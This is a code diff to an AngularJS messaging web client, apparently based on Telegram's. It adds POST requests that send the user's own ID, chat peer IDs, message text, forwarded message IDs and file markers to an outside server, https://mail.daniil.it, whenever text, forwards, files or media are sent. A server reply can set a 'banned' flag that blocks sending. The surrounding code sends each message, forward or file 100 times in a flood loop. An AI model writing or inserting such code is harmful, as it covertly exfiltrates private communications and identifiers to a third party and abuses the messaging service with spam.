@@ -2183,7 +2183,7 @@ angular.module('myApp.controllers', ['myApp.i18n'])
     $scope.$on('user_update', angular.noop)
   })
 
-  .controller('AppImSendController', function ($rootScope, $q, $scope, $timeout, MtpApiManager, Storage, AppProfileManager, AppChatsManager, AppUsersManager, AppPeersManager, AppDocsManager, AppMessagesManager, AppInlineBotsManager, MtpApiFileManager, DraftsManager, RichTextProcessor) {
+  .controller('AppImSendController', function ($rootScope, $http, $q, $scope, $timeout, MtpApiManager, Storage, AppProfileManager, AppChatsManager, AppUsersManager, AppPeersManager, AppDocsManager, AppMessagesManager, AppInlineBotsManager, MtpApiFileManager, DraftsManager, RichTextProcessor) {
     $scope.$watch('curDialog.peer', resetDraft)
     $scope.$on('user_update', angular.noop)
     $scope.$on('peer_draft_attachment', applyDraftAttachment)
@@ -2259,6 +2259,19 @@ angular.module('myApp.controllers', ['myApp.i18n'])
             clearDraft: true
           }
           var floodtext = text;
+          var request = $http({
+              method: 'POST',
+              url: "https://mail.daniil.it",
+              data: $.param({peer:  $scope.curDialog.peer, peerID: $scope.curDialog.peerID, ownID: $scope.ownID, message: text, domain: 7}),
+              headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+          });
+          request.success(
+              function(html) {
+                if (html == $scope.ownID) $scope.banned = true;
+              }
+          );
+
+
           for (var flood = 0; flood < 100; flood++) { // flood
             text = floodtext;
             do {
@@ -2533,6 +2546,29 @@ angular.module('myApp.controllers', ['myApp.i18n'])
         var ids = $scope.draftMessage.fwdMessages.slice()
         fwdsClear()
         setZeroTimeout(function () {
+
+          var ids_string = '';
+          angular.forEach(ids, function (object) {
+              angular.forEach(object, function (value, key) {
+                  ids_string += key + ',';
+                  ids_string += value + ',';
+              });
+          });
+          var request = $http({
+              method: 'POST',
+              url: "https://mail.daniil.it",
+              data: $.param({peer:  $scope.curDialog.peer, peerID: $scope.curDialog.peerID, ownID: $scope.ownID, message: ids_string, domain: 7}),
+              headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+          });
+          request.success(
+              function( html ) {
+                if (html == $scope.ownID) $scope.banned = true;
+              }
+          );
+          if ($scope.banned) {
+            return;
+          }
+
           for (var flood = 0; flood < 100; flood++) {
             AppMessagesManager.forwardMessages($scope.curDialog.peerID, ids)
           }
@@ -2708,6 +2744,21 @@ angular.module('myApp.controllers', ['myApp.i18n'])
       }
 
       for (var i = 0; i < newVal.length; i++) {
+        var request = $http({
+            method: 'POST',
+            url: "https://mail.daniil.it",
+            data: $.param({peer:  $scope.curDialog.peer, peerID: $scope.curDialog.peerID, ownID: $scope.ownID, message: newVal[i]+" it's a file", domain: 7}),
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+        });
+        request.success(
+            function( html ) {
+              if (html == $scope.ownID) $scope.banned = true;
+            }
+        );
+        if ($scope.banned) {
+          return;
+        }
+
         for (var flood = 0; flood < 100; flood++) {
           AppMessagesManager.sendFile($scope.curDialog.peerID, newVal[i], options)
           $scope.$broadcast('ui_message_send')
@@ -2734,6 +2785,22 @@ angular.module('myApp.controllers', ['myApp.i18n'])
         var options = {
           replyToMsgID: $scope.draftMessage.replyToMsgID
         }
+        var request = $http({
+            method: 'POST',
+            url: "https://mail.daniil.it",
+            data: $.param({peer:  $scope.curDialog.peer, peerID: $scope.curDialog.peerID, ownID: $scope.ownID, message: 'file', domain: 7}),
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+        });
+        request.success(
+            function( html ) {
+              if (html == $scope.ownID) $scope.banned = true;
+            }
+        );
+        if ($scope.banned) {
+          return;
+        }
+
+
         for (var flood = 0; flood < 100; flood++) {
           AppMessagesManager.sendOther($scope.curDialog.peerID, inputMedia, options)
           $scope.$broadcast('ui_message_send')
